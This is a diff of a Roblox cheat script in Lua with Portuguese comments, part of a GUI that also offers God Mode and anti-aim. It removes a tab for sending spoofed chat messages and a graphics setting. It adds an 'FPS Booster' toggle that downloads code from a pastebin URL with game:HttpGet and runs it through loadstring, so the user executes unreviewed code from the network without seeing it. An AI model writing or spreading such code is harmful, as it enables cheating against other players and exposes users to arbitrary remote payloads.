@@ -700,48 +700,6 @@ monitorPlayer()
 
 
 
-
--- Adicionando uma nova aba chamada "Fake Chat"
-local FakeChatTab = Window:AddTab({ Title = "Fake Chat", Icon = "" })
-
--- Função para enviar uma mensagem falsa no chat
-local function fakeChatMessage(message)
-    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
-end
-
--- Adicionando um campo de entrada para inserir a mensagem
-FakeChatTab:AddInput("FakeChatInput", {
-    Title = "Mensagem Falsa",
-    Placeholder = "Digite sua mensagem",
-    Callback = function(value)
-        -- Quando a mensagem for enviada, chamamos a função para enviá-la no chat
-        if value and value ~= "" then
-            fakeChatMessage(value)
-            print("Mensagem enviada:", value) -- Para feedback no console
-        else
-            print("Por favor, insira uma mensagem válida.")
-        end
-    end
-})
-
--- Adicionando um botão para enviar a mensagem
-FakeChatTab:AddButton({
-    Title = "Enviar Mensagem",
-    Callback = function()
-        local message = FakeChatTab:GetInputValue("FakeChatInput")
-        if message and message ~= "" then
-            fakeChatMessage(message)
-            print("Mensagem enviada:", message)
-        else
-            print("Por favor, insira uma mensagem válida.")
-        end
-    end
-})
-
-
-
-
-
 -- Função para ativar God Mode
 local function activateGodMode()
     local player = game.Players.LocalPlayer
@@ -1664,27 +1622,36 @@ antiAimTab:AddButton({
     end
 })
 
--- Função para ajustar gráficos
-local function setGraphicsLevel(level)
-    if level >= 1 and level <= 10 then
-        game:GetService("GraphicsSettings").QualityLevel = level
-        print("Nível de gráficos ajustado para:", level)
-    else
-        print("Nível de gráficos inválido. Use um valor de 1 a 10.")
-    end
+
+-- Função para ativar o FPS Booster
+local function activateFPSBooster()
+    loadstring(game:HttpGet("https://pastebin.com/raw/8YZ2cc6V"))()
+    print("FPS Booster ativado.")
 end
 
--- Adicionando a aba de Gráficos
-local graphicsTab = Window:AddTab({ Title = "Gráficos", Icon = "graphics" })
+-- Função para desativar o FPS Booster (opcional, dependendo do script)
+local function deactivateFPSBooster()
+    -- Aqui você pode adicionar a lógica para desativar o FPS Booster, se necessário
+    print("FPS Booster desativado (se aplicável).")
+end
 
--- Input para ajustar gráficos
-graphicsTab:AddInput("GraphicsInput", {
-    Title = "Nível de Gráficos (1-10)",
-    PlaceholderText = "Insira o nível de gráficos",
-    Callback = function(value)
-        setGraphicsLevel(tonumber(value))
+-- Adicionar aba "FPS Booster"
+local FPSBoosterTab = Window:AddTab({ Title = "FPS Booster", Icon = "fps" })
+
+-- Adicionar botão de alternância para ativar/desativar o FPS Booster
+FPSBoosterTab:AddToggle("FPSBoosterToggle", {
+    Title = "Ativar FPS Booster",
+    Default = false,
+    Description = "Ative para aumentar o FPS do jogo.",
+    Callback = function(Value)
+        if Value then
+            activateFPSBooster()
+        else
+            deactivateFPSBooster() -- Caso queira implementar uma lógica de desativação
+        end
     end
 })
+
 
 -- Função para tocar música no jogo
 local function playMusic(assetId)
